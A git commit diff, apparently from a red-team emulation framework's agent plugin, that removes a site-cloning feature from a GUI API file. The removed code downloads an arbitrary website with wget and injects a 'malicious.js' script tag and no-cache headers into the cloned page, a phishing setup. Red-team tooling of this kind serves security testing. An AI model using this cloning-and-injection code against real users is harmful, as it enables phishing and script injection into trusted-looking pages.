574a11788920cb694bfee6da9e2aafa49aff3bc1
david <49954156+privateducky@users.noreply.github.com>
2019-11-11 10:41:00 -0500

    WIP adding server-side agent for operator to use for initial access (#129)
    * adding server-side agent for operator to use for initial access
    
    * changes
    
    
    Former-commit-id: 1205e91a32483657ff97b50e9d082618c6eebdeb

--- app/sand_gui_api.py
+++ app/sand_gui_api.py
@@ -1,8 +1,3 @@
-import shutil
-import subprocess
-
-from urllib.parse import urlparse
-from aiohttp import web
 from aiohttp_jinja2 import template
 
 
@@ -11,41 +6,10 @@ class SandGuiApi:
     def __init__(self, services):
         self.auth_svc = services.get('auth_svc')
         self.app_svc = services.get('app_svc')
+        self.data_svc = services.get('data_svc')
 
     @template('sandcat.html')
     async def splash(self, request):
         await self.auth_svc.check_permissions(request)
         plugins = [dict(name=getattr(p, 'name'), address=getattr(p, 'address')) for p in self.app_svc.get_plugins()]
         return dict(plugins=plugins)
-
-    @staticmethod
-    async def malicious(request):
-        return web.HTTPFound('/malicious/index.html')
-
-    async def clone_new_site(self, request):
-        await self.auth_svc.check_permissions(request)
-        url = request.rel_url.query['url']
-        if self._uri_validator(url):
-            location = 'plugins/sandcat/static/malicious/'
-            shutil.rmtree(location, ignore_errors=True)
-            user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) " \
-                         "Chrome/76.0.3809.100 Safari/537.36"
-            subprocess.call(["wget", "-U", user_agent, "-E", "-H", "-k", "-K", "-p", "-q", "-nH", "--cut-dirs=1", url,
-                             "--directory", location, "--no-check-certificate"], shell=False)
-            self.auth_svc.prepend_to_file('%s/index.html' % location,
-                                          '<script src="/sandcat/js/malicious.js"></script>')
-            self.auth_svc.prepend_to_file('%s/index.html' % location, '<meta http-equiv="Expires" content="0">')
-            self.auth_svc.prepend_to_file('%s/index.html' % location, '<meta http-equiv="Pragma" content="no-cache">')
-            self.auth_svc.prepend_to_file('%s/index.html' % location, '<meta http-equiv="Cache-Control" '
-                                                                      'content="no-cache, no-store, must-revalidate">')
-        return web.Response()
-
-    """ PRIVATE """
-
-    @staticmethod
-    def _uri_validator(url):
-        try:
-            result = urlparse(url)
-            return all([result.scheme, result.netloc])
-        except Exception:
-            return False
